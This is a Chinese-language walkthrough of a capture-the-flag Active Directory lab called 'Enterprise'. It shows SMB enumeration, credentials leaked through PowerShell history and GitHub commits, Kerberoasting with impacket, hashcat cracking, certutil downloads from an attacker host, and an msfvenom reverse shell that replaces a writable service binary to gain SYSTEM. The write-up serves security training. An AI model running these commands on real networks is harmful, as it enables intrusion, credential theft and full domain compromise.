# Enterprise

难度：难

- Active directory
- Kerberos
- Real world

您刚刚进入内部网络。您扫描网络，只有域控制器...

---

## 端口扫描

循例 nmap扫：nmap -sS -sV 10.10.61.164 -p 1-10000 -T5：

    53/tcp   open  domain        Simple DNS Plus
    80/tcp   open  http          Microsoft IIS httpd 10.0
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-07 02:54:00Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  tcpwrapped
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
    3269/tcp open  tcpwrapped
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    7990/tcp open  http          Microsoft IIS httpd 10.0
    9389/tcp open  mc-nmf        .NET Message Framing
    Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

从扫描结果我们不难看出，域名：

    ENTERPRISE.THM

remmina连接3389，查看证书信息，我们得到：

    LAB-DC.LAB.ENTERPRISE.THM

80、5357都是web，都没有任何信息，7990是一个登录页面

## SMB枚举

    smbclient -L 10.10.61.164

有这么些文件夹：

    ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Docs            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      Users Share. Do Not Touch!

Docs目录：

    smbclient //10.10.61.164/Docs                                     127 ⨯ 1 ⚙
    Password for [WORKGROUP\root]:
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Mon Mar 15 10:47:35 2021
    ..                                  D        0  Mon Mar 15 10:47:35 2021
    RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 10:46:54 2021
    RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 10:45:24 2021

我们发现了powershell的history

    smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\> ls

    .                                   D        0  Fri Mar 12 12:00:39 2021
    ..                                  D        0  Fri Mar 12 12:00:39 2021
    Consolehost_hisory.txt              A      424  Fri Mar 12 11:51:46 2021

里面披露了一组凭据：

    echo "replication:101RepAdmin123!!">private.txt

经过尝试，这组凭据似乎并不有效

## OSINT

回头来看那个登录页面：

    提醒所有Enterprise-THM员工：
    我们要搬去Github了! 

根据这段话，我们去github搜索：Enterprise-THM

没有找到什么存储库，但是有一个user引起我们的注意：

    Enterprise.THM

该用户的头像跟我们的题目一样，看来没错了

该用户有一个存储库，但是没啥东西。

但是它的People下有一个用户，并且该用户也有一个存储库

    https://github.com/Nik-enterprise-dev/mgmtScript.ps1

这里披露了凭据，但是是空的，我们通过查看github history就可以找到历史提交中存在一组凭据：

    $userName = 'nik'
    $userPassword = 'ToastyBoi!'

利用该账户能够进入smb共享文件夹，但是没啥有用的东西

## Kerberoasting

现在这组凭据确认是有效的，我们现在有资格尝试Kerberoasting攻击：

    python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.61.164 LAB.ENTERPRISE.THM/nik:ToastyBoi! -request

成功获得bitbucket账户的密码hash:

    ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
    --------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
    HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 09:20:01.333272  2021-04-26 23:16:41.570158

## hashcat 爆破

将得到的密码hash保存到文件，并使用hashcat进行爆破:

    hashcat -a 0 -m 13100 ./hash /usr/share/wordlists/rockyou.txt

成功获得明文密码：

    littleredbucket

## 上帝封死了门和窗，但上帝也在房间内！

我们尝试使用该账户枚举smb、winrm/psexec登录，都不行，但是rdp却成功了

user.txt在桌面下

现在我们传入WinPEAS.exe和accesschk.exe

    certutil -urlcache -split -f http://10.14.39.48:8000/winPEASx64.exe
    certutil -urlcache -split -f http://10.14.39.48:8000/accesschk64.exe

运行winPEAS，通过winPEAS得知：

    zerotieroneservice - binary path未引号包裹且路径有空格

该服务以system权限运行

    C:\Users\bitbucket>sc qc zerotieroneservice
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: zerotieroneservice
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : zerotieroneservice
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem

使用accesschk检索：

    PS C:\Users\bitbucket> .\accesschk64.exe -w "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe"

    C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
    RW BUILTIN\Users
    RW NT AUTHORITY\SYSTEM
    RW BUILTIN\Administrators

我们对该exe文件可读写

    C:\Users\bitbucket>accesschk64 -cv zerotieroneservice

    Accesschk v6.15 - Reports effective permissions for securable objects
    Copyright (C) 2006-2022 Mark Russinovich
    Sysinternals - www.sysinternals.com

    zerotieroneservice
    Medium Mandatory Level (Default) [No-Write-Up]
    R  LAB-ENTERPRISE\bitbucket
            SERVICE_PAUSE_CONTINUE
            SERVICE_START
            SERVICE_STOP
            READ_CONTROL

我们可以控制该服务启动或停止

msfvenom生成reverse shell并上传到目标

    msfvenom -p windows/x64/shell_reverse_tcp lhost=10.14.39.48 lport=8888 -f exe-service > she11.exe

使用certutil将文件上传，然后copy到目标目录并覆盖目标exe:

    copy .\she11.exe "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe"

在cmd运行：

    sc stop zerotieroneservice
    sc start zerotieroneservice

成功getshell

root.txt在administrator的桌面下
